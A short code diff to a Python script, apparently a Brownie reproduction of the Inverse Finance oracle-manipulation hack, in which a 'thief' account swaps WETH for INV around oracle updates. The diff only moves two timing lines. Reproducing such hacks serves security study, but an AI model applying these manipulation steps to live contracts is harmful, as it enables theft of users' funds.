@@ -68,10 +68,6 @@ def hack_inverse():
 
     print('Sync INV-WETH pair and oracle feed to update blockchain timestamp in contracts store\n')
     inv_weth_pair.sync({'from': accounts[0]})
-
-    start_time = chain.time()
-    time_to_resync_pair = start_time + 15
-
     keep_3r_v2_oracle_factory.workForFree(inv_weth_pair, {'from': accounts[0]})
 
     print_prices()
@@ -104,6 +100,9 @@ def hack_inverse():
         300 * 10**18, 0, [weth, inv], thief, chain.time() + 1000, {'from': thief})
     inv_amount_out_2 = inv.balanceOf(thief) - inv_amount_out_1
     print(f'Received {format_amount(inv_amount_out_2, inv.decimals())} INV\n')
+
+    start_time = chain.time()
+    time_to_resync_pair = start_time + 15
 
     print_prices()
 
